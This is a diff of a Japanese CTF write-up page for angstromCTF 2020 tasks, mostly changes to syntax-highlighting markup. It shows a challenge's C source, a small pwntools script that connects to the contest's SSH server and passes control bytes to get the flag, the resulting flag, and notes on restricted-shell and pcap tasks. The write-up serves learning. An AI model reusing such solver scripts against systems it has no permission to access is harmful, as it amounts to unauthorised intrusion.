-    <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">&#34; </span><span class="se">\n</span><span class="s">&#39;</span><span class="se">\&#34;\x07</span><span class="s">&#34;</span><span class="p">))</span> <span class="p">{</span>
-        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Your argument isn&#39;t right.&#34;</span><span class="p">);</span>
-        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
-    <span class="p">}</span>
-    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
-    <span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\x00\x01\x02\x03\n</span><span class="s">&#34;</span><span class="p">))</span> <span class="p">{</span>
-        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Your input isn&#39;t right.&#34;</span><span class="p">);</span>
-        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
-    <span class="p">}</span>
-    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;You seem to know what you&#39;re doing.&#34;</span><span class="p">);</span>
-    <span class="n">print_flag</span><span class="p">();</span>
-<span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">#define _GNU_SOURCE
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#define FLAGSIZE 128
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">print_flag</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="nf">getegid</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">FILE</span> <span class="o">*</span><span class="n">file</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;flag.txt&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="n">FLAGSIZE</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">file</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Cannot read flag file.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fgets</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="n">FLAGSIZE</span><span class="p">,</span> <span class="n">file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">flag</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Your argument count isn&#39;t right.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">&#34; </span><span class="se">\n</span><span class="s">&#39;</span><span class="se">\&#34;\x07</span><span class="s">&#34;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Your argument isn&#39;t right.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\x00\x01\x02\x03\n</span><span class="s">&#34;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Your input isn&#39;t right.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;You seem to know what you&#39;re doing.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">print_flag</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
-</div><p><br /></p>
-<h3 id="unsolved-1">(Unsolved)</h3>
-<p>ちょっとヒントの意味もわからなかったです。意外と難しいもんですね。後日、復習しておきます。</p>
+</div><br />
+### (Unsolved)
+ちょっとヒントの意味もわからなかったです。意外と難しいもんですね。後日、復習しておきます。
 <p><br /><br />
 2020/03/20 - 復習しました。</p>
 <p>なんか、pwntoolsで普通にできたみたいです。イベント中にやったときは、なぜかできなかった気がしたんですけど。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -956,22 +947,22 @@ Hint: There are ways to run programs without using the shell.</p>
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python</span>
-<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-
-<span class="k">if</span> <span class="mi">1</span><span class="p">:</span>
-    <span class="n">user</span><span class="o">=</span><span class="s1">&#39;xxxxx&#39;</span>
-    <span class="n">pw</span><span class="o">=</span><span class="s1">&#39;yyyyy&#39;</span>
-    <span class="n">s</span><span class="o">=</span><span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;shell.actf.co&#39;</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="n">user</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">pw</span><span class="p">)</span>
-    <span class="n">s</span><span class="o">.</span><span class="n">set_working_directory</span><span class="p">(</span><span class="s1">&#39;/problems/2020/inputter&#39;</span><span class="p">)</span>
-    <span class="n">p</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="s2">&#34;./inputter&#34;</span><span class="p">,</span><span class="s2">&#34; </span><span class="se">\n</span><span class="s2">&#39;</span><span class="se">\&#34;\x07</span><span class="s2">&#34;</span><span class="p">])</span>
-<span class="k">else</span><span class="p">:</span>
-    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&#34;./inputter&#34;</span><span class="p">,</span><span class="s2">&#34; </span><span class="se">\n</span><span class="s2">&#39;</span><span class="se">\&#34;\x07</span><span class="s2">&#34;</span><span class="p">])</span>
-
-<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x00\x01\x02\x03\n</span><span class="s2">&#34;</span><span class="p">)</span>
-<span class="n">msg</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
-<span class="k">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">user</span><span class="o">=</span><span class="s1">&#39;xxxxx&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pw</span><span class="o">=</span><span class="s1">&#39;yyyyy&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">=</span><span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;shell.actf.co&#39;</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="n">user</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">pw</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">set_working_directory</span><span class="p">(</span><span class="s1">&#39;/problems/2020/inputter&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="s2">&#34;./inputter&#34;</span><span class="p">,</span><span class="s2">&#34; </span><span class="se">\n</span><span class="s2">&#39;</span><span class="se">\&#34;\x07</span><span class="s2">&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&#34;./inputter&#34;</span><span class="p">,</span><span class="s2">&#34; </span><span class="se">\n</span><span class="s2">&#39;</span><span class="se">\&#34;\x07</span><span class="s2">&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x00\x01\x02\x03\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">msg</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><br>
 <pre>
@@ -1003,9 +994,9 @@ actf{impr4ctic4l_pr0blems_c4ll_f0r_impr4ctic4l_s0lutions}
 ssh <a href="mailto:chall@misc.2020.chall.actf.co">chall@misc.2020.chall.actf.co</a>
 <br><br></p>
 </blockquote>
-<p><br /></p>
-<h3 id="unsolved-2">(Unsolved)</h3>
-<p>restricted shellの問題です。</p>
+<br />
+### (Unsolved)
+restricted shellの問題です。
 <p>どうやら、チャレンジが削除されてしまったようなので、何か不具合があったのかもです。</p>
 <p>これは解きたかったなぁ。（というか、解けないやつだったかもだけど。）</p>
 <p><br /><br />
@@ -1025,7 +1016,7 @@ ssh <a href="mailto:chall@misc.2020.chall.actf.co">chall@misc.2020.chall.actf.co
 <ul>
 <li>record.pcapng</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-5">Solution</h3>
 <p>git-receive-pack というのが出てきて、よく知らなかったのでスルーしたやつなんですが、gitを使わずとも解ける問題だったみたいなので再度やってみました。</p>
 <p>HTTP のオブジェクトをExportします。いくつかありますが、サイズが他と比べて特別大きい18KBのやつを狙います。</p>
@@ -1113,7 +1104,7 @@ B7.zlib:             zlib compressed data
     <footer id="footer" class="footer">
       <div class="social-links">
       <a href="https://github.com/CaptureAmerica/" class="iconfont icon-github" title="github"></a>
-  <a href="https://captureamerica.github.io/writeups/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+  
 </div>
 
 <div class="copyright">
@@ -1148,20 +1139,21 @@ B7.zlib:             zlib compressed data
 
 
 
-<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.c12618f9a600c40bd024996677e951e64d3487006775aeb22e200c990006c5c7.js"></script>
+<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.4ae89da218555efa0e7093a20b92017d2e1202b66fff9fc2edf4cb8d44b44c6e.js"></script>
 
 
 <script type="application/javascript">
 var doNotTrack = false;
 if (!doNotTrack) {
-	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
 	ga('create', 'UA-104910699-2', 'auto');
 	ga('set', 'anonymizeIp', true);
 	ga('send', 'pageview');
 }
 </script>
-<script async src='https://www.google-analytics.com/analytics.js'></script>
-
 
 
 
